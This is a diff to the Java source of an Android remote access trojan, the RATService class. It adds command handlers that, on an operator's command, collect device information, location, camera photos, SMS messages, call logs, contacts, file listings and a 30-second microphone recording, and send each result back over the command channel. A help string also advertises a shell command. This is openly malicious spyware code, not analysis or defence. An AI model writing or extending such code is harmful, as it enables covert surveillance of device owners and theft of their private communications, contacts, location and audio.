@@ -385,6 +385,92 @@ public class RATService extends Service {
                 sendCommand("PONG");
                 break;
                 
+            case "info":
+            case "INFO":
+                if (deviceModule != null) {
+                    String result = deviceModule.getDeviceInfo();
+                    sendCommand("INFO|" + result);
+                } else {
+                    sendCommand("INFO|ERROR: Device module not available");
+                }
+                break;
+                
+            case "location":
+            case "LOCATION":
+                if (locationModule != null) {
+                    String result = locationModule.getLocation();
+                    sendCommand("LOCATION|" + result);
+                } else {
+                    sendCommand("LOCATION|ERROR: Location module not available");
+                }
+                break;
+                
+            case "camera":
+            case "CAMERA":
+                if (cameraModule != null) {
+                    String result = cameraModule.takePhoto();
+                    sendCommand("CAMERA|" + result);
+                } else {
+                    sendCommand("CAMERA|ERROR: Camera module not available");
+                }
+                break;
+                
+            case "sms":
+            case "SMS":
+                if (smsModule != null) {
+                    String result = smsModule.getSms();
+                    sendCommand("SMS|" + result);
+                } else {
+                    sendCommand("SMS|ERROR: SMS module not available");
+                }
+                break;
+                
+            case "calls":
+            case "CALLS":
+                if (callsModule != null) {
+                    String result = callsModule.getCallLogs();
+                    sendCommand("CALLS|" + result);
+                } else {
+                    sendCommand("CALLS|ERROR: Calls module not available");
+                }
+                break;
+                
+            case "contacts":
+            case "CONTACTS":
+                if (contactsModule != null) {
+                    String result = contactsModule.getContacts();
+                    sendCommand("CONTACTS|" + result);
+                } else {
+                    sendCommand("CONTACTS|ERROR: Contacts module not available");
+                }
+                break;
+                
+            case "files":
+            case "FILES":
+                if (fileModule != null) {
+                    String path = args.isEmpty() ? "/sdcard" : args;
+                    String result = fileModule.listFiles(path);
+                    sendCommand("FILES|" + result);
+                } else {
+                    sendCommand("FILES|ERROR: File module not available");
+                }
+                break;
+                
+            case "mic":
+            case "MIC":
+                if (micModule != null) {
+                    String result = micModule.startRecording(30);
+                    sendCommand("MIC|" + result);
+                } else {
+                    sendCommand("MIC|ERROR: Microphone module not available");
+                }
+                break;
+                
+            case "help":
+            case "HELP":
+                sendCommand("HELP|Available commands: info, location, camera, sms, calls, contacts, files, mic, shell, ping");
+                break;
+                
             case "CAMERA_PHOTO":
                 if (cameraModule != null) {
                     String result = cameraModule.takePhoto();
